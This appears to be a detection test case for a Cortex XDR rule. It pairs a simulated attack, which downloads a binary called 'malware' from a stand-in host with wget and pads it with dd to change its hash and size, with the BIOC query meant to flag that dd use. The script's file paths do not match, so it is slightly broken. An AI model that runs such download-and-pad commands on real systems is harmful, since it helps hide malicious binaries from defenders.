identity.name: ELF Padding with dd to Evade Hash/Size Detection
identity.summary: An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding.
identity.description: An attacker uses the dd command to append null bytes to an ELF binary, inflating its size and altering its hash to evade detection. Cortex should identify this behavior as possible binary padding.

payload.code:
mkdir -p /tmp/scratch
wget -O /tmp/scratch/malware.bin https://example.com/malware
chmod +x /tmp/scratch/malware
/bin/dd if=/tmp/scratch/malware of=/tmp/scratch/padded_malware bs=1024 count=1024 conv=notrunc

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Possible Binary Padding Using dd
biocs.description: Detection of dd command being used to append null bytes to an ELF binary
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/bin/dd'
| filter action_process_command_line contains 'conv=notrunc'
